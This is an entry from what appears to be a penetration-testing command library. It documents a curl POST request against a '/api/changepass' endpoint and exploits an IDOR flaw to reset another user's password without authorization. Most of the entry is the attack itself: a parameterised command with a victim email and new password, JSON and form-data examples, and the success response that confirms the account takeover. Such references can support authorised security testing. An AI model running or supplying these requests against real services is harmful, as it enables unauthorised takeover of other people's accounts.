---
id: 7fc79c33-02a2-4821-a25a-2bfca0ea9d48
name: curl-post-changepass-request
type: command
executor: bash
data: >-
  curl -X POST https://target.com/api/changepass -H "Content-Type:
  application/json" -d '{"email":"$_VICTIM_EMAIL","password":"$_NEW_PASSWORD"}'
output: null
created_at: '2023-04-06T03:55:59.566505+00:00'
updated_at: '2023-04-06T03:55:59.574541+00:00'
platforms:
  - Web
tags:
  - api
  - idor
  - account-takeover
verified: true
validated: true
---

# curl-post-changepass-request

## Command

```bash
curl -X POST $_TARGET_URL/api/changepass \
  -H "Content-Type: $_CONTENT_TYPE" \
  -d '{"email":"$_VICTIM_EMAIL","password":"$_NEW_PASSWORD"}'
```

## Description

This command sends a POST request to a web application's password change API endpoint to exploit an IDOR vulnerability, allowing unauthorized password resets for a target account. Use it when the endpoint lacks proper validation on the email parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Base URL of the target application (e.g., https://target.com) | Yes |
| $_CONTENT_TYPE | MIME type for the request body (e.g., application/json or application/x-www-form-urlencoded) | Yes |
| $_VICTIM_EMAIL | Email address of the victim's account to target | Yes |
| $_NEW_PASSWORD | New password to set for the account | Yes |
| -X POST | Specifies the HTTP method as POST | Built-in |
| -H | Adds custom headers to the request | Built-in |
| -d | Sends data in the request body | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/api/changepass \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","password":"newpass123"}'
```

### Advanced Usage (Form Data)

```bash
curl -X POST https://target.com/api/changepass \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'email=victim@example.com&password=newpass123'
```

## Expected Output

A successful response indicating the password was updated, such as:

```json
{
  "status": "success",
  "message": "Password changed successfully"
}
```

HTTP status code 200. Errors may return 400/403 if validation exists, but success confirms the IDOR exploitation.

## Related

- [[procedures/Account-Takeover-via-Password-Reset-and-IDOR-on-API-Parameters]]
